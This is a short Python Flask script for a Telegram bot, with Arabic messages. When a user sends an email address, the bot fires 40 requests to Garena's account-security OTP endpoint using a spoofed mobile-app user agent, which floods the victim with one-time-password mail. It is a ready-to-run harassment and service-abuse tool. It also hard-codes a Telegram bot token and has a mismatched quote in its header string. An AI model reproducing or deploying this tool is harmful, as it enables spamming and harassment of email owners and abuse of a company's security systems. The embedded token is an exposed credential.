import requests
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, jsonify
import asyncio

app = Flask(__name__)

BOT_TOKEN = "8658580899:AAGklJayHDFNGVlSRmRr6oC8J6i_YwLRcKA"
GARENA_URL = "https://100067.connect.garena.com/game/account_security/swap:send_otp"

headers = {
    'User-Agent': "GarenaMSDK/4.0.41(SM-A065F ;Android 15;ar;MA;app 1.123.1 2019120270;)',
    'Connection': "Keep-Alive",
    'Accept': "application/json",
    'Accept-Encoding': "gzip"
}

def send_telegram(chat_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        for i in range(0, len(text), 4000):
            requests.post(url, json={"chat_id": chat_id, "text": text[i:i+4000]}, timeout=5)
    except:
        pass

@app.route("/", methods=["GET"])
def home():
    return "Bot is running", 200

@app.route(f"/webhook/{BOT_TOKEN}", methods=["POST"])
def webhook():
    try:
        update = request.get_json()
        if not update or "message" not in update:
            return jsonify({"status": "ok"}), 200
        
        chat_id = update["message"].get("chat", {}).get("id")
        text = update["message"].get("text", "").strip()
        
        if not chat_id:
            return jsonify({"status": "ok"}), 200
        
        if "@" in text and "." in text:
            send_telegram(chat_id, f"⏳ جاري ارسال 40 طلب الى {text}...")
            
            results = []
            payload = {'app_id': "100067", 'email': text, 'locale': "ar_MA"}
            
            for i in range(1, 41):
                try:
                    response = requests.post(GARENA_URL, data=payload, headers=headers, timeout=5)
                    results.append(f"[{i}] {response.status_code}")
                except Exception as e:
                    results.append(f"[{i}] خطأ")
            
            result_text = "\n".join(results)
            send_telegram(chat_id, f"✅ النتائج:\n\n{result_text}")
        elif text == "/start":
            send_telegram(chat_id, "📧 ارسل الايميل لارسال 40 طلب")
        
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        return jsonify({"status": "error"}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
